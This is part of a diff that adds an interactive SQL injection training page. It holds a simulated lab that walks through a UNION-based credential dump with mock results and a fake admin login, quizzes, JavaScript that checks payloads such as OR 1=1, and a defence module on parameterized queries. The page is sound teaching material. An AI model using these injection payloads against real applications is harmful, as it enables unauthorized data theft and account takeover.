+              <div class="response-box">
+                <div class="resp-label">COLUMNS IN users</div>
+                <div class="resp-body success"><strong>username</strong><br><strong>password</strong><br>email<br>created_at</div>
+              </div>
+              <button class="step-btn" onclick="lab4Step(4)">Next: Extract Credentials →</button>
+            </div>
+          </div>
+
+          <div class="step-item" data-step="4">
+            <div class="step-dot"></div>
+            <div class="step-content">
+              <div class="step-num">STEP 6 — CRITICAL</div>
+              <div class="step-title">Dump Credentials</div>
+              <div class="code-block">
+                <div class="code-label">PAYLOAD</div>
+                <pre><span class="sql-keyword">' UNION SELECT</span> username, password
+<span class="sql-keyword">FROM</span> users <span class="sql-comment">--</span></pre>
+              </div>
+              <div class="response-box">
+                <div class="resp-label">CREDENTIALS EXTRACTED</div>
+                <div class="resp-body success cred-dump">
+                  <div class="cred-row header-row"><span>USERNAME</span><span>PASSWORD</span></div>
+                  <div class="cred-row"><span>administrator</span><span class="cred-pass">s3cr3tp4ss!</span></div>
+                  <div class="cred-row"><span>carlos</span><span>monkey</span></div>
+                  <div class="cred-row"><span>wiener</span><span>peter</span></div>
+                </div>
+              </div>
+              <button class="step-btn" onclick="lab4Step(5)">Next: Login + Knowledge Check →</button>
+            </div>
+          </div>
+
+          <div class="step-item" data-step="5">
+            <div class="step-dot"></div>
+            <div class="step-content">
+              <div class="step-num">FINAL STEP</div>
+              <div class="step-title">Log in with Extracted Credentials</div>
+              <div class="fake-login-form">
+                <div class="login-title">🔐 Admin Login</div>
+                <div class="form-group">
+                  <label>Username</label>
+                  <input type="text" id="lab4-username" class="fake-input" value="administrator">
+                </div>
+                <div class="form-group">
+                  <label>Password</label>
+                  <input type="password" id="lab4-password" class="fake-input" value="s3cr3tp4ss!">
+                </div>
+                <button class="login-btn" onclick="lab4Login()">Log In as Administrator</button>
+                <div class="login-result" id="lab4-result"></div>
+              </div>
+
+              <div class="quiz-container" style="margin-top:20px">
+                <div class="quiz-q">What is <code>information_schema</code> and why is it dangerous in SQL Injection?</div>
+                <div class="quiz-options">
+                  <button class="quiz-opt" onclick="lab4Quiz(this, false)">A table that stores user passwords in plaintext</button>
+                  <button class="quiz-opt" onclick="lab4Quiz(this, true)">A built-in schema containing metadata about all database tables and columns — attackers use it to map the entire database</button>
+                  <button class="quiz-opt" onclick="lab4Quiz(this, false)">An admin-only table not accessible via SQL</button>
+                  <button class="quiz-opt" onclick="lab4Quiz(this, false)">A logging table used for audit trails</button>
+                </div>
+                <div class="quiz-result" id="lab4-quiz-result"></div>
+              </div>
+            </div>
+          </div>
+
+        </div>
+      </div>
+
+      <div class="lab-info-panel">
+        <div class="info-card">
+          <div class="info-card-title">🎯 Objective</div>
+          <p>Extract all usernames and passwords, then log in as <code>administrator</code>.</p>
+        </div>
+        <div class="info-card">
+          <div class="info-card-title">🗺 Attack Chain</div>
+          <ol class="impact-ul ordered">
+            <li>Confirm injection</li>
+            <li>Find column count</li>
+            <li>Fingerprint database</li>
+            <li>List all tables</li>
+            <li>List columns in target</li>
+            <li>Dump credentials</li>
+          </ol>
+        </div>
+        <div class="info-card">
+          <div class="info-card-title">🌍 Real-World Impact</div>
+          <ul class="impact-ul">
+            <li>Full credential dump</li>
+            <li>Data breach</li>
+            <li>System compromise</li>
+          </ul>
+        </div>
+        <div class="lab-complete-badge" id="lab4-badge" style="display:none;">
+          <div class="badge-icon">🏆</div>
+          <div class="badge-text">Lab 4 Complete!</div>
+        </div>
+      </div>
+    </div>
+  </section>
+
+  <!-- ===================== SECTION: PREVENTION ===================== -->
+  <section id="section-prevention" class="section">
+    <div class="section-header">
+      <div class="section-tag">DEFENSE MODULE</div>
+      <h1>Preventing SQL Injection</h1>
+      <p class="section-desc">Now that you understand how attacks work, learn how to stop them. These are industry-standard defenses used by every secure application.</p>
+    </div>
+
+    <div class="card-grid">
+
+      <div class="card card-defense">
+        <div class="card-icon">🛡</div>
+        <h3>1. Parameterized Queries (Prepared Statements)</h3>
+        <p>The <strong>most effective</strong> defense. User input is never concatenated into the SQL string — it's passed as a separate parameter.</p>
+        <div class="code-compare">
+          <div>
+            <div class="code-label bad-label">❌ VULNERABLE</div>
+            <div class="code-block">
+              <pre>query = <span class="sql-string">"SELECT * FROM users
+WHERE user = '"</span> + input + <span class="sql-string">"'"</span></pre>
+            </div>
+          </div>
+          <div>
+            <div class="code-label good-label">✅ SAFE</div>
+            <div class="code-block">
+              <pre>query = <span class="sql-string">"SELECT * FROM users
+WHERE user = ?"</span>
+stmt.setString(<span class="sql-number">1</span>, input)</pre>
+            </div>
+          </div>
+        </div>
+      </div>
+
+      <div class="card card-defense">
+        <div class="card-icon">📦</div>
+        <h3>2. Use an ORM (Object Relational Mapper)</h3>
+        <p>ORMs like Sequelize, SQLAlchemy, or Hibernate generate parameterized queries automatically. You never write raw SQL.</p>
+        <div class="code-block">
+          <div class="code-label">DJANGO ORM EXAMPLE (SAFE)</div>
+          <pre>User.objects.<span class="sql-function">get</span>(username=username)</pre>
+        </div>
+      </div>
+
+      <div class="card card-defense">
+        <div class="card-icon">✅</div>
+        <h3>3. Input Validation & Allow-Lists</h3>
+        <p>Validate and sanitize all user input. Use allow-lists (whitelist only known-good values) rather than blocklists.</p>
+        <div class="type-list">
+          <div class="type-item"><span class="type-badge">Strip</span><span>Remove special characters like <code>'</code> <code>--</code> <code>;</code></span></div>
+          <div class="type-item"><span class="type-badge">Whitelist</span><span>Only allow expected values (e.g., category must be Gifts, Pets, etc.)</span></div>
+          <div class="type-item"><span class="type-badge">Reject</span><span>Return error if input doesn't match expected pattern</span></div>
+        </div>
+      </div>
+
+      <div class="card card-defense">
+        <div class="card-icon">🔒</div>
+        <h3>4. Principle of Least Privilege</h3>
+        <p>The database account your app uses should have <strong>only the permissions it needs</strong>. A read-only app should use a read-only DB user.</p>
+        <div class="impact-list">
+          <div class="impact-item"><span class="impact-icon">🚫</span> No DROP TABLE access for web users</div>
+          <div class="impact-item"><span class="impact-icon">🚫</span> No access to system tables</div>
+          <div class="impact-item"><span class="impact-icon">✅</span> Separate read/write accounts</div>
+        </div>
+      </div>
+
+      <div class="card card-defense">
+        <div class="card-icon">🚨</div>
+        <h3>5. Web Application Firewall (WAF)</h3>
+        <p>A WAF inspects HTTP traffic and blocks requests that match known attack patterns like <code>UNION SELECT</code> or <code>OR 1=1</code>.</p>
+        <div class="info-box warning-box">
+          <strong>Not a silver bullet.</strong> WAFs can be bypassed by skilled attackers. They're a layer of defense, not a replacement for secure code.
+        </div>
+      </div>
+
+      <div class="card card-defense">
+        <div class="card-icon">📊</div>
+        <h3>6. Monitor & Log</h3>
+        <p>Log all database queries and monitor for suspicious patterns. Anomaly detection can catch active attacks in progress.</p>
+      </div>
+
+    </div>
+
+    <div class="final-summary">
+      <h3>🎓 Course Summary</h3>
+      <div class="summary-grid">
+        <div class="summary-item"><div class="si-icon">💀</div><div class="si-text"><strong>Lab 1</strong> — WHERE Clause injection bypasses data filters</div></div>
+        <div class="summary-item"><div class="si-icon">🔓</div><div class="si-text"><strong>Lab 2</strong> — Login bypass using SQL comments removes authentication</div></div>
+        <div class="summary-item"><div class="si-icon">🔍</div><div class="si-text"><strong>Lab 3</strong> — UNION SELECT maps query structure and finds text columns</div></div>
+        <div class="summary-item"><div class="si-icon">💾</div><div class="si-text"><strong>Lab 4</strong> — Full chain attack extracts entire credential database</div></div>
+        <div class="summary-item"><div class="si-icon">🛡</div><div class="si-text"><strong>Defense</strong> — Parameterized queries are the primary defense</div></div>
+      </div>
+    </div>
+  </section>
+
+</main>
+
+<script>
+/* ============================================
+   SQLi LAB — Interactive Logic
+   ============================================ */
+
+// ===== STATE =====
+const state = {
+  completedLabs: new Set(),
+  lab1Step: 0,
+  lab2Step: 0,
+  lab3Step: 0,
+  lab4Step: 0,
+};
+
+// ===== NAVIGATION =====
+document.querySelectorAll('.nav-item').forEach(btn => {
+  btn.addEventListener('click', () => showSection(btn.dataset.section));
+});
+
+function showSection(id) {
+  document.querySelectorAll('.section').forEach(s => s.classList.remove('active'));
+  document.querySelectorAll('.nav-item').forEach(b => b.classList.remove('active'));
+
+  const section = document.getElementById('section-' + id);
+  if (section) section.classList.add('active');
+
+  const navBtn = document.querySelector(`[data-section="${id}"]`);
+  if (navBtn) navBtn.classList.add('active');
+
+  // Close sidebar on mobile
+  document.getElementById('sidebar').classList.remove('open');
+
+  window.scrollTo(0, 0);
+}
+
+// Hamburger
+document.getElementById('hamburger').addEventListener('click', () => {
+  document.getElementById('sidebar').classList.toggle('open');
+});
+
+// ===== PROGRESS =====
+function updateProgress() {
+  const total = 4;
+  const done = state.completedLabs.size;
+  document.getElementById('progressBar').style.width = (done / total * 100) + '%';
+  document.getElementById('progressText').textContent = `${done} / ${total} Labs Completed`;
+}
+
+function markLabComplete(labNum) {
+  state.completedLabs.add(labNum);
+  updateProgress();
+  const badge = document.getElementById(`lab${labNum}-badge`);
+  if (badge) badge.style.display = 'block';
+
+  // Update nav tag
+  const navBtn = document.querySelector(`[data-section="lab${labNum}"]`);
+  if (navBtn) {
+    const icon = navBtn.querySelector('.nav-icon');
+    if (icon) icon.textContent = '✓';
+    navBtn.style.color = 'var(--green)';
+  }
+}
+
+// ===== STEP HELPERS =====
+function activateStep(labId, stepIndex) {
+  const steps = document.querySelectorAll(`#section-${labId} .step-item`);
+  steps.forEach((step, i) => {
+    step.classList.remove('active', 'completed');
+    if (i < stepIndex) step.classList.add('completed');
+    if (i === stepIndex) step.classList.add('active');
+  });
+  // Scroll active step into view
+  if (steps[stepIndex]) {
+    steps[stepIndex].scrollIntoView({ behavior: 'smooth', block: 'nearest' });
+  }
+}
+
+// ===== LAB 1 — WHERE CLAUSE =====
+function lab1Step(stepNum) {
+  state.lab1Step = stepNum;
+  activateStep('lab1', stepNum);
+}
+
+function lab1Inject() {
+  const input = document.getElementById('lab1-inject-input').value.trim();
+  const response = document.getElementById('lab1-inject-response');
+
+  const lowerInput = input.toLowerCase();
+  const hasPayload =
+    lowerInput.includes("or+1=1") ||
+    lowerInput.includes("or 1=1") ||
+    lowerInput.includes("'or") ||
+    (lowerInput.includes("or") && lowerInput.includes("1=1") && lowerInput.includes("--"));
+
+  const hasQuote = input.includes("'");
+  const hasComment = input.includes('--');
+
+  if (hasPayload && hasQuote && hasComment) {
+    // SUCCESS
+    response.innerHTML = `
+      <div style="color:var(--green); margin-bottom:8px; font-weight:bold;">✅ 200 OK — Injection Successful!</div>
+      <div style="font-size:0.78rem; color:var(--text-muted); margin-bottom:12px;">SQL query returned ALL products including unreleased ones:</div>
+      <div class="product-grid" id="lab1-all-products">
+        <div class="fake-product"><div class="fp-img"></div><div class="fp-name">Gift Box Premium</div><div class="fp-price">£29.99</div></div>
+        <div class="fake-product"><div class="fp-img" style="background:#2a4040"></div><div class="fp-name">Luxury Candle Set</div><div class="fp-price">£44.99</div></div>
+        <div class="fake-product"><div class="fp-img" style="background:#3a2a40"></div><div class="fp-name">Photo Frame Gold</div><div class="fp-price">£19.99</div></div>
+        <div class="fake-product fp-unreleased"><div class="fp-img" style="background:#401515"></div><div class="fp-name">🔴 UNRELEASED: Secret Kit</div><div class="fp-price">£89.99</div></div>
+        <div class="fake-product fp-unreleased"><div class="fp-img" style="background:#3a1530"></div><div class="fp-name">🔴 UNRELEASED: Dev Sample</div><div class="fp-price">£0.00</div></div>
+      </div>
+    `;
+    // Progress to step 4
+    setTimeout(() => lab1Step(4), 1200);
+  } else if (!hasQuote) {
+    response.innerHTML = `<div style="color:var(--yellow);">⚠ Missing single quote to close the SQL string. Try: category=Gifts'...</div>`;
+  } else if (!hasComment) {
+    response.innerHTML = `<div style="color:var(--yellow);">⚠ Missing SQL comment (--) to remove the released=1 filter.</div>`;
+  } else if (!lowerInput.includes("or")) {
+    response.innerHTML = `<div style="color:var(--yellow);">⚠ You need an OR condition. Try adding OR 1=1 to make the condition always true.</div>`;
+  } else {
+    response.innerHTML = `
+      <div style="color:var(--red);">❌ 500 Internal Server Error</div>
+      <div style="font-size:0.75rem; color:var(--text-muted); margin-top:6px;">Syntax error in your SQL. Check the payload format carefully.</div>
+    `;
+  }
+}
+
+function lab1Hint() {
+  const hint = document.getElementById('lab1-hint');
+  hint.style.display = hint.style.display === 'none' ? 'block' : 'none';
+}
+
+function lab1Quiz(btn, isCorrect) {
+  const opts = btn.closest('.quiz-options').querySelectorAll('.quiz-opt');
+  opts.forEach(o => o.disabled = true);
+
+  const result = document.getElementById('lab1-quiz-result');
+
+  if (isCorrect) {
+    btn.classList.add('correct');
+    result.className = 'quiz-result correct';
+    result.textContent = '✅ Correct! OR 1=1 always evaluates to TRUE, making the entire WHERE clause true for every row. The database returns all products, ignoring the released = 1 filter entirely.';
+    markLabComplete(1);
+  } else {
+    btn.classList.add('wrong');
+    result.className = 'quiz-result wrong';
+    result.textContent = '❌ Not quite. OR 1=1 is a logical condition that always evaluates to TRUE, causing the database to return every row in the products table regardless of other conditions.';
+  }
+}
+
+// ===== LAB 2 — LOGIN BYPASS =====
+function lab2Step(stepNum) {
+  state.lab2Step = stepNum;
+  activateStep('lab2', stepNum);
+}
+
+function lab2Hint() {
+  const hint = document.getElementById('lab2-hint');
+  hint.style.display = hint.style.display === 'none' ? 'block' : 'none';
+}
+
+function lab2Login() {
+  const username = document.getElementById('lab2-username').value;
+  const password = document.getElementById('lab2-password').value;
+  const result = document.getElementById('lab2-result');
+
+  if (!username.trim()) {
+    result.className = 'login-result error-msg';
+    result.textContent = '❌ Please enter a username.';
+    return;
+  }
+
+  const uLower = username.toLowerCase();
+  const hasBypass =
+    (uLower.includes('administrator') || uLower.includes('admin')) &&
+    username.includes("'") &&
+    username.includes('--');
+
+  const isValidLogin = username === 'administrator' && password === 'correct_password';
+
+  if (hasBypass) {
+    result.className = 'login-result success-msg';
+    result.innerHTML = `
+      ✅ <strong>Welcome, Administrator!</strong><br>
+      <span style="font-size:0.78rem; color:var(--text-muted);">
+        Logged in without knowing the password. The SQL comment (--) commented out the AND password check entirely.
+      </span>
+    `;
+    lab2Step(3);
+    setTimeout(() => {
+      markLabComplete(2);
+    }, 500);
+  } else if (isValidLogin) {
+    result.className = 'login-result success-msg';
+    result.textContent = '✅ Login successful (normal path — try the SQL injection!)';
+  } else if (username.includes("'") && !username.includes('--')) {
+    result.className = 'login-result error-msg';
+    result.textContent = "❌ Good start — you're breaking the SQL string. Now add -- to comment out the password check!";
+  } else if (username.toLowerCase().includes('administrator') && !username.includes("'")) {
+    result.className = 'login-result error-msg';
+    result.textContent = "❌ Username alone won't work. You need to close the string with ' and use -- to bypass the password.";
+  } else {
+    result.className = 'login-result error-msg';
+    result.textContent = '❌ Invalid credentials. Hint: inject into the username field.';
+  }
+}
+
+function lab2Quiz(btn, isCorrect) {
+  const opts = btn.closest('.quiz-options').querySelectorAll('.quiz-opt');
+  opts.forEach(o => o.disabled = true);
+
+  const result = document.getElementById('lab2-quiz-result');
+
+  if (isCorrect) {
+    btn.classList.add('correct');
+    result.className = 'quiz-result correct';
+    result.textContent = "✅ Exactly right! The -- SQL comment is processed server-side before the query reaches the database. It eliminates the AND password = '...' condition entirely, so the password is never checked.";
+    markLabComplete(2);
+  } else {
+    btn.classList.add('wrong');
+    result.className = 'quiz-result wrong';
+    result.textContent = "❌ Incorrect. The key is the -- comment operator. It makes the SQL engine ignore everything after it — including the password comparison.";
+  }
+}
+
+// ===== LAB 3 — UNION DISCOVERY =====
+function lab3Step(stepNum) {
+  state.lab3Step = stepNum;
+  activateStep('lab3', stepNum);
+}
+
+function lab3Test() {
+  const select = document.getElementById('lab3-payload-select');
+  const output = document.getElementById('lab3-output');
+  const val = select.value;
+
+  const responses = {
+    none: `<div class="terminal-idle">Select a payload to test...</div>`,
+    '1null': `
+      <div style="color:var(--red); margin-bottom:8px;">HTTP/1.1 500 Internal Server Error</div>
+      <div style="color:var(--text-muted); font-size:0.78rem;">ERROR: UNION SELECT must have the same number of result columns<br>
+      📊 Column count 1 ≠ original query column count. Try adding more NULLs.</div>
+    `,
+    '2null': `
+      <div style="color:var(--red); margin-bottom:8px;">HTTP/1.1 500 Internal Server Error</div>
+      <div style="color:var(--text-muted); font-size:0.78rem;">ERROR: each UNION query must have the same number of columns<br>
+      📊 Column count 2 ≠ original. One more NULL needed.</div>
+    `,
+    '3null': `
+      <div style="color:var(--green); margin-bottom:8px;">HTTP/1.1 200 OK</div>
+      <div style="color:var(--green); font-size:0.78rem;">✅ Query succeeded! Column count = 3 confirmed.</div>
+      <div style="color:var(--text-muted); font-size:0.75rem; margin-top:8px;">Products page renders normally. Our extra NULL row was silently injected into the results.</div>
+    `,
+    col1: `
+      <div style="color:var(--red); margin-bottom:8px;">HTTP/1.1 500 Internal Server Error</div>
+      <div style="color:var(--text-muted); font-size:0.78rem;">ERROR: invalid input syntax for type integer: "test"<br>
+      ❌ Column 1 is a numeric type (e.g., product ID). Cannot hold string data.</div>
+    `,
+    col2: `
+      <div style="color:var(--green); margin-bottom:8px;">HTTP/1.1 200 OK</div>
+      <div style="color:var(--green); font-size:0.78rem;">✅ String 'test' appears in the response!</div>
+      <div style="color:var(--text-muted); font-size:0.75rem; margin-top:8px;">Page renders with a product entry showing "test" as the product name.<br>
+      🎯 Column 2 is our text-injectable column — this is where we'll put usernames and passwords!</div>
+    `,
+    col3: `
+      <div style="color:var(--red); margin-bottom:8px;">HTTP/1.1 500 Internal Server Error</div>
+      <div style="color:var(--text-muted); font-size:0.78rem;">ERROR: invalid input syntax for type numeric: "test"<br>
+      ❌ Column 3 is a numeric type (e.g., price). Cannot hold string data.</div>
+    `,
+  };
+
+  output.innerHTML = responses[val] || `<div class="terminal-idle">Unknown payload selected.</div>`;
+
+  if (val === 'col2') {
+    setTimeout(() => markLabComplete(3), 800);
+  }
+}
+
+function lab3Quiz(btn, isCorrect) {
+  const opts = btn.closest('.quiz-options').querySelectorAll('.quiz-opt');
+  opts.forEach(o => o.disabled = true);
+
+  const result = document.getElementById('lab3-quiz-result');
+
+  if (isCorrect) {
+    btn.classList.add('correct');
+    result.className = 'quiz-result correct';
+    result.textContent = '✅ Correct! SQL\'s UNION operator requires both SELECT statements to return the same number of columns with compatible data types. Mismatched counts cause a database error immediately.';
+    markLabComplete(3);
+  } else {
+    btn.classList.add('wrong');
+    result.className = 'quiz-result wrong';
+    result.textContent = '❌ Incorrect. This is a SQL rule enforced by the database engine itself — UNION requires matching column counts and compatible data types in every combined SELECT.';
+  }
+}
+
+// ===== LAB 4 — DATA EXTRACTION =====
+const lab4ChainSteps = {
+  0: 'ac1', 1: 'ac2', 2: 'ac3', 3: 'ac4', 4: 'ac5', 5: 'ac6'
+};
+
+function lab4Step(stepNum) {
+  state.lab4Step = stepNum;
+  activateStep('lab4', stepNum);
+
+  // Update attack chain
+  const allChainSteps = document.querySelectorAll('.ac-step');
+  allChainSteps.forEach((el, i) => {
+    el.classList.remove('active-chain', 'done');
+    if (i < stepNum) el.classList.add('done');
+    if (i === stepNum) el.classList.add('active-chain');
+  });
+
+  // Mark lines
+  const lines = document.querySelectorAll('.ac-line');
+  lines.forEach((line, i) => {
+    line.style.background = i < stepNum ? 'var(--green)' : 'var(--border)';
+  });
+}
+
+function lab4Login() {
+  const username = document.getElementById('lab4-username').value;
+  const password = document.getElementById('lab4-password').value;
+  const result = document.getElementById('lab4-result');
+
+  if (username === 'administrator' && password === 's3cr3tp4ss!') {
+    result.className = 'login-result success-msg';
+    result.innerHTML = `
+      🎉 <strong>Access Granted — Administrator Dashboard</strong><br>
+      <span style="font-size:0.78rem; color:var(--text-muted);">
+        Credentials extracted via UNION attack and used to gain full admin access. This is how real data breaches lead to system compromise.
+      </span>
+    `;
+    // Complete attack chain
+    lab4Step(5);
+    document.querySelectorAll('.ac-step').forEach(el => {
+      el.classList.remove('active-chain');
+      el.classList.add('done');
+    });
+    document.querySelectorAll('.ac-line').forEach(line => {
+      line.style.background = 'var(--green)';
+    });
+    markLabComplete(4);
+  } else {
+    result.className = 'login-result error-msg';
+    result.textContent = '❌ Wrong credentials. Use the ones extracted from the database above!';
+  }
+}
+
+function lab4Quiz(btn, isCorrect) {
+  const opts = btn.closest('.quiz-options').querySelectorAll('.quiz-opt');
+  opts.forEach(o => o.disabled = true);
+
+  const result = document.getElementById('lab4-quiz-result');
+
+  if (isCorrect) {
+    btn.classList.add('correct');
+    result.className = 'quiz-result correct';
+    result.textContent = '✅ Exactly right! information_schema is a read-only schema in SQL that contains metadata about the database — all tables, all columns, all data types. It exists in PostgreSQL, MySQL, MSSQL and others. Attackers query it to map the entire database structure before extracting real data.';
+    markLabComplete(4);
+  } else {
+    btn.classList.add('wrong');
+    result.className = 'quiz-result wrong';
+    result.textContent = '❌ Incorrect. information_schema is a standard SQL metadata schema that describes all tables and columns in the database. It\'s publicly readable by any authenticated user, making it a goldmine for attackers who gain SQL injection.';
+  }
+}
+
+// ===== INIT =====
+document.addEventListener('DOMContentLoaded', () => {
+  // Activate first step of each lab
+  activateStep('lab1', 0);
+  activateStep('lab2', 0);
+  activateStep('lab3', 0);
+  activateStep('lab4', 0);
+
+  // Initialize attack chain for lab4
+  document.getElementById('ac1')?.classList.add('done');
+
+  updateProgress();
+
+  // Typewriter effect on hero title
+  const h1 = document.querySelector('#section-concept h1');
+  if (h1) {
+    const original = h1.textContent;
+    h1.textContent = '';
+    let i = 0;
+    const timer = setInterval(() => {
+      h1.textContent += original[i];
+      i++;
+      if (i >= original.length) clearInterval(timer);
+    }, 30);
+  }
+});
+
+// ===== KEYBOARD NAV =====
+document.addEventListener('keydown', (e) => {
+  if (e.key === 'Escape') {
+    document.getElementById('sidebar').classList.remove('open');
+  }
+});
+
+</script>
+</body>
+</html>
